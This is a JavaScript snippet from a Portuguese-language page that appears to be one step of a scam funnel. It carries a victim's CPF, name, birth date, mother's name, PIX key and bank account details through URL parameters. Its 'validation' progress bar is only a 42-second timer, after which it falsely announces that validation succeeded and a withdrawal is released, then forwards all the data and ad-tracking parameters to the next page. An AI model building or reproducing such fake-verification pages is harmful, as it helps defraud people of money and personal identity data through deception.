<script>
var params = new URLSearchParams(window.location.search);
var cpf   = params.get('cpf')   || '';
var nome  = params.get('nome')  || '';
var nasc  = params.get('nasc')  || '';
var mae   = params.get('mae')   || '';
var valor = params.get('valor') || '';

var vid          = document.getElementById('vid');
var progBar      = document.getElementById('progBar');
var overlaysom   = document.getElementById('overlaysom');
var overlayPause = document.getElementById('overlayPause');
var somAtivado   = false;

// Autoplay mudo
vid.muted = true;
vid.play().catch(function(){});

// BARRA inicia imediatamente — independente do clique
var barW = 0;
var durTotal = 42; // segundos
var ivBarra = setInterval(function(){
  barW += 100 / (durTotal * 2);
  if(barW >= 100){
    barW = 100;
    clearInterval(ivBarra);
    progBar.style.width = '100%';
    document.getElementById('validandoTxt').textContent = 'Validação concluída com sucesso!';
    document.getElementById('tempoTxt').textContent = 'Saque liberado — clique abaixo para continuar';
    document.getElementById('btnResultado').style.display = 'block';
    return;
  }
  progBar.style.width = barW + '%';
  var restante = Math.ceil((100 - barW) / 100 * durTotal);
  document.getElementById('tempoTxt').textContent = 'Tempo restante: ' + restante + 's';
}, 500);

// Clique no overlay SOM → ativa som
overlaysom.addEventListener('click', function(e){
  e.stopPropagation();
  vid.muted = false;
  vid.volume = 1;
  somAtivado = true;
  overlaysom.style.display = 'none';
  vid.currentTime = 0;
  vid.play().catch(function(){});
});

// Clique no overlay PAUSE → retomar
overlayPause.addEventListener('click', function(e){
  e.stopPropagation();
  overlayPause.style.display = 'none';
  vid.play().catch(function(){});
});

// Clique no vídeo → pause/play (só depois do som ativado)
document.getElementById('videoWrap').addEventListener('click', function(){
  if(!somAtivado) return;
  if(vid.paused) vid.play().catch(function(){});
  else vid.pause();
});

// Mostrar overlay pause quando pausado
vid.addEventListener('pause', function(){
  if(somAtivado) overlayPause.style.display = 'flex';
});
vid.addEventListener('play', function(){
  overlayPause.style.display = 'none';
});

// Quando vídeo termina — garante que barra vai a 100%
vid.addEventListener('ended', function(){
  clearInterval(ivBarra);
  progBar.style.width = '100%';
  document.getElementById('validandoTxt').textContent = 'Validação concluída com sucesso!';
  document.getElementById('tempoTxt').textContent = 'Saque liberado — clique abaixo para continuar';
  document.getElementById('btnResultado').style.display = 'block';
});

function verResultado(){
  var url = '../9/index.html?cpf=' + cpf;
  if(nome)  url += '&nome='  + encodeURIComponent(nome);
  if(nasc)  url += '&nasc='  + encodeURIComponent(nasc);
  if(mae)   url += '&mae='   + encodeURIComponent(mae);
  if(valor) url += '&valor=' + encodeURIComponent(valor);
  var tipoOp    = params.get('tipo-operacao') || '';
  var pixKey    = params.get('PIX')           || '';
  var tipoChave = params.get('tipo-chave')    || '';
  var nomeBanco = params.get('nome-banco')    || '';
  var agencia   = params.get('agencia')       || '';
  var conta     = params.get('numero-conta')  || '';
  if(tipoOp)    url += '&tipo-operacao=' + encodeURIComponent(tipoOp);
  if(pixKey)    url += '&PIX='           + encodeURIComponent(pixKey);
  if(tipoChave) url += '&tipo-chave='    + encodeURIComponent(tipoChave);
  if(nomeBanco) url += '&nome-banco='    + encodeURIComponent(nomeBanco);
  if(agencia)   url += '&agencia='       + encodeURIComponent(agencia);
  if(conta)     url += '&numero-conta='  + encodeURIComponent(conta);
  // Repassa UTMs
  ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','src','sck','fbclid'].forEach(function(k){
    var v = params.get(k);
    if(v) url += '&' + k + '=' + encodeURIComponent(v);
  });
  window.location.href = url;
}
</script>
